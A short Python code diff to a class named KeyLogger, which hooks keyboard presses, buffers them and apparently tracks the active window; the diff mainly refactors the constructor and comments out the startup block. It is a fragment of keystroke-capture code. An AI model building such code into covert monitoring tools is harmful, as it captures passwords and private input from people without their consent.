@@ -4,8 +4,8 @@ import pygetwindow as gw
 
 
 class KeyLogger:
-    def __init__(self):
-        self.machine_name = socket.gethostname()
+    def __init__(self, machine_name):
+        self.machine_name = machine_name
         self.running = True
         self.buffer = {}
 
@@ -37,5 +37,13 @@ class KeyLogger:
 
     def start(self):
         keyboard.on_press(self.log_event)
-        print("Keylogger started. Press CTRL+C to stop.")
-        keyboard.wait()
+        # keyboard.wait()
+
+# if __name__ == "__main__":
+#     keylogger = KeyLogger("keylogger")
+#
+#     try:
+#         keylogger.start()
+#     except KeyboardInterrupt:
+#         keylogger.stop()
+#         print(keylogger.get_and_clear_buffer())
